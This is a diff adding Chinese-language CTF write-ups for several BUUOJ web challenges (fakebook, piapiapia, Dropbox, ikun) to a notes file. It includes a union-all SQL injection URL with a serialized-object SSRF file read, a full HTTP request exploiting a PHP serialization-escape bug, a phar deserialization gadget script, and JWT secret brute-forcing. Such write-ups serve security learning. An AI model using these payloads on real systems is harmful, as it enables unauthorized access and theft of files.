@@ -498,6 +498,269 @@ flag{f475e0ca-7337-4331-b968-13555bb2d874}
 
 
 
+### fakebook
+
+>[19:15:02] 200 -    1KB - /login.php
+>[19:16:56] 200 -   37B  - /robots.txt
+>[19:18:26] 200 -    0B  - /user.php
+>[19:18:36] 200 - 1019B  - /view.php
+
+查看robots.txt得到user.php.bak
+
+
+
+数据库名:` fakebook,information_schema,mysq  l,performance_schema,test `
+
+表名:` fakebook: users`
+
+列名:` no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNEC`
+
+//没有管理员账号
+
+叫我们ssrf?
+
+看了一下正则,发现好像没啥机会,思路到这里就断了
+
+
+
+查看data发现是反序列化后的数据,那么可以猜测view.php是从数据库中取出序列化后的内容对其进行反序列化再显示内容
+
+用union来让view.php反序列化我们提供的内容
+
+但是union select 被过滤了,用union all select 来绕过
+
+最后的payload
+
+`http://03cd35f0-7b3a-4e24-a2ba-cb1e9d4d944c.node3.buuoj.cn/view.php?no=6666 union all select 1,2,3,'O%3A8%3A"UserInfo"%3A3%3A{s%3A4%3A"name"%3Bs%3A4%3A"evil"%3Bs%3A3%3A"age"%3Bi%3A0%3Bs%3A4%3A"blog"%3Bs%3A29%3A"file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fflag.php"%3B}' `
+
+
+
+### piapiapia
+
+>[20:44:48] 200 -  392KB - /www.zip
+>
+>[20:44:15] 403 -  571B  - /upload/
+
+
+
+拿到代码后审计发现sql过滤还是很严格的没法逃脱单引号
+
+但是我们注意到了
+
+```php
+public function filter($string) {
+		$escape = array('\'', '\\\\');
+		$escape = '/' . implode('|', $escape) . '/';
+		$string = preg_replace($escape, '_', $string);
+
+		$safe = array('select', 'insert', 'update', 'delete', 'where');
+		$safe = '/' . implode('|', $safe) . '/i';
+		return preg_replace($safe, 'hacker', $string);
+	}
+
+
+public function update_profile($username, $new_profile) {
+		$username = parent::filter($username);
+		$new_profile = parent::filter($new_profile);
+
+		$where = "username = '$username'";
+		return parent::update($this->table, 'profile', $new_profile, $where);
+	}
+
+
+
+$user->update_profile($username, serialize($profile));
+```
+
+
+
+这三个东西碰到一起后会发现神奇的事情
+
+fileter将`where`替换为`hacker`后,会溢出一个字符,而where是在反序列化里的
+
+`s:6:"where""`=>`s:6:"hacker""`这样就可以成功逃逸出序列化,修改序列化的内容
+
+继续跟踪profile发现`$photo  = base64_encode(file_get_contents($profile['photo']));`
+
+这样我们就可以任意读取文件了
+
+还有一个小问题需要解决
+
+
+```php
+
+if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {
+
+		$username = $_SESSION['username'];
+		if(!preg_match('/^\d{11}$/', $_POST['phone']))
+			die('Invalid phone');
+
+		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
+			die('Invalid email');
+		
+		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
+			die('Invalid nickname');
+
+		$file = $_FILES['photo'];
+		if($file['size'] < 5 or $file['size'] > 1000000)
+			die('Photo size error');
+
+		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
+		$profile['phone'] = $_POST['phone'];
+		$profile['email'] = $_POST['email'];
+		$profile['nickname'] = $_POST['nickname'];
+		$profile['photo'] = 'upload/' . md5($file['name']);
+
+		$user->update_profile($username, serialize($profile));
+		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
+	}
+
+```
+
+
+
+这里对输入内容都有正则过滤,但是如果我们传入数组就可以绕过正则匹配
+
+最后的payload:
+
+```
+POST /update.php HTTP/1.1
+Host: 6c42e2f6-f6cf-40c9-a1bf-ef7c57418b22.node3.buuoj.cn
+Content-Length: 711
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
+Origin: http://6c42e2f6-f6cf-40c9-a1bf-ef7c57418b22.node3.buuoj.cn
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj2Bi57wuJTQvgVXE
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: http://6c42e2f6-f6cf-40c9-a1bf-ef7c57418b22.node3.buuoj.cn/update.php
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=b86493a015084e5774751fd0b405fbf3
+Connection: close
+
+------WebKitFormBoundaryj2Bi57wuJTQvgVXE
+Content-Disposition: form-data; name="phone"
+
+01234567891
+------WebKitFormBoundaryj2Bi57wuJTQvgVXE
+Content-Disposition: form-data; name="email"
+
+1127@qq.com
+------WebKitFormBoundaryj2Bi57wuJTQvgVXE
+Content-Disposition: form-data; name="nickname[]"
+
+wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
+------WebKitFormBoundaryj2Bi57wuJTQvgVXE
+Content-Disposition: form-data; name="photo"; filename="aaaa"
+Content-Type: application/octet-stream
+
+aaaaa
+------WebKitFormBoundaryj2Bi57wuJTQvgVXE--
+
+```
+
+
+
+
+
+### Dropbox
+
+用download.php发现可以任意文件下载但是用open_basedir限制了目录,猜测flag再根目录(/flag.txt)
+
+题目提示phar,分析一下,最后是要用File的close()来读取文件
+
+魔术方法
+
+```php
+FileList : __call	__destruct
+User : __destruct
+```
+
+
+
+User->FileList(`__call`)->File(`close`)
+
+
+
+```php
+<?php
+class User {
+    public $db;
+    public function __construct()
+    {
+        $this->db=new FileList();
+    }
+}
+
+class FileList {
+    private $files;
+    private $results;
+    private $funcs;
+
+    public function __construct() {
+        $file=new File();
+        $this->files=array($file);
+        $this->results=array();
+        $this->funcs=array();
+    }
+
+    public function __call($func, $args) {
+        array_push($this->funcs, $func);
+        foreach ($this->files as $file) {
+            $this->results[$file->name()][$func] = $file->$func();
+        }
+    }
+
+}
+class File {
+    public $filename="/flag.txt";
+}
+
+$a=new User();
+@unlink("phar.phar");
+$phar = new Phar("phar.phar"); //后缀名必须为phar,phar伪协议不用phar后缀
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+
+$phar->setMetadata($a); //将自定义的meta-data存入manifest
+$phar->addFromString("test.txt", "test"); //添加要压缩的文件
+//签名自动计算
+$phar->stopBuffering();
+
+
+?>
+```
+
+
+
+### ikun
+
+
+
+修改account参数可以修改价格
+
+爬虫找到lv6,修改account购买进入b1g_m4mber
+
+
+
+爆破jwt的密钥为`1Kun`,进入管理员后台
+
+```html
+<!-- 潜伏敌后已久,只能帮到这了 -->
+<a href="/static/asd1f654e683wq/www.zip" ><span style="visibility:hidden">删库跑路前我留了好东西在这里</span></a>
+<div class="ui segments center padddd">
+<!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 -->
+```
+
+
+
+拿到网站源码
+
+
+
+
+
 ## jarvisoj
 
 ### re?
